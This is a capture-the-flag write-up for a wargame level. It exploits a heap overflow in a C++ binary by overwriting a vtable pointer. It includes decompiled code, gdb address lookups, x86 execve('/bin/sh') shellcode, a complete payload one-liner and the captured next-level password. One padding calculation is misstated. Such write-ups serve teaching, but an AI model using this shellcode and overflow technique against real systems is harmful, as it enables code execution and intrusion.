# Level9

We have an executable that does not display anything.

```
$ ls
level9
$ ./level9
$ ./level9 test
```

Once again, the code is too long to discuss in asm, so we'll use dogbolt.
</br>
<<https://dogbolt.org>>
</br>
Here is the idea behind the code. We can see that it is C++.
The program allocates two objects of 108 bytes each, ``operatornew(108)``.

```
int main(unsigned int a0, struct_2 *a1)
{
    void* v5;  // ebx
    struct_1 **v6;  // ebx
    char v0;  // [bp-0x20]
    struct_1 **v1;  // [bp-0x18]
    void* v2;  // [bp-0x14]
    struct_1 **v3;  // [bp-0x10]
    void* v4;  // [bp-0xc]

    if (a0 > 1)
    {
        v5 = operatornew(108);
        N::N(v5, 5);
        v4 = v5;
        v6 = operatornew(108);
        N::N(v6, 6);
        v3 = v6;
        v2 = v4;
        v1 = v3;
        N::setAnnotation(v2, a1->field_4);
        return *(v1)->field_0(v1, v2, *((int *)&v0));
    }
    _exit(1); /* do not return */
}
```

Here is an overview of the ``template's functions``.

```
int N::N(void* ptr, int arg_0)
{
    *((char **)ptr) = &g_8048848;
    *((int *)&ptr[104]) = arg_0;
    return;
}

void N::setAnnotation(void* this, char *ptr)
{
    memcpy(this + 4, ptr, strlen(ptr));
    return;
}

void N::operator+(void* this, class N &arg_0)
{
    return;
}

void N::operator-(void* this, class N &arg_0)
{
    return;
}
```

The one we're interested in is the one that ``uses memcpy with the size of argv[1]``.
</br>
But it has a ``100-byte buffer, there is no verification``.
</br>
So we can spill over from ``the first into the second``.

```
void N::setAnnotation(void* this, char *ptr)
{
    memcpy(this + 4, ptr, strlen(ptr));
    return;
}
```

Now here is the target.
</br>
In C++, this corresponds to a ``call to a virtual method``.
</br>
Here it takes the address of ``the second object``.
</br>
Read the first 4 bytes to find out where ``the vtable is located``.

```
return *(v1)->field_0(v1, v2, *((int *)&v0));
```

The goal is to use the ``overflow to change the address of the vtable`` so that it sends the code I want.

Now the plan is to create my payload:
- with a ``shellcode`` at the very beginning that will ``launch /bin/sh``
- then padding to ``reach the second object``,
- finally, point ``the fake pointer to the vtable``.

But we are also missing two important elements: the ``two addresses of the objects``.
</br>
To do this, we look for the addresses in the executable file right ``after the allocations``.
</br>
To break on it and then ``read the value in eax``.

```
$ objdump -d ./level9
 080485f4 <main>:
 ...
 8048617:       e8 14 ff ff ff          call   8048530 <_Znwj@plt>
 804861c:       89 c3                   mov    %eax,%ebx
 ...
 8048639:       e8 f2 fe ff ff          call   8048530 <_Znwj@plt>
 804863e:       89 c3                   mov    %eax,%ebx
 ...
```

Here are the two addresses: ``0x0804a008``, ``0x0804a078``

```
$ gdb ./level9
(gdb) b *0x0804861c
Breakpoint 1 at 0x804861c
(gdb) run test
Starting program: /home/user/level9/level9 test

Breakpoint 1, 0x0804861c in main ()
(gdb) p/x $eax
$1 = 0x804a008
(gdb) b *0x0804863e
Breakpoint 2 at 0x804863e
(gdb) c
Continuing.

Breakpoint 2, 0x0804863e in main ()
(gdb) p/x $eax
$2 = 0x804a078
```

Now we need to create a ``shellcode`` that executes ``/bin/sh``.
</br>
Here is the code in ``asm``.

```
xor    ecx,ecx
xor    eax,eax
xor    edx,edx
push   eax
push   0x2f68732f
push   0x6e69622f
or     eax,0x1
shl    eax,0x3
or     eax,0x3
lea    ebx,[esp]
int    0x80 
```

With this site, you can quickly convert it into shellcode.
</br>
<<https://defuse.ca/online-x86-assembler.htm>>

```
"\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"
```

This shellcode is 31 characters long.
So my payload must consist of:
- 4 bytes for the vtable address (0x0804a008 + 8 = 0x0804a010)
- 31 bytes for the shellcode
- 73 bytes for padding (108 - 4 - 31 = 108)
- 4 bytes for the address of object 1 (0x0804a008 + 4 = 0x0804a00c)

```
$ ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80" + "A"*73 + "\x0c\xa0\x04\x08")')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```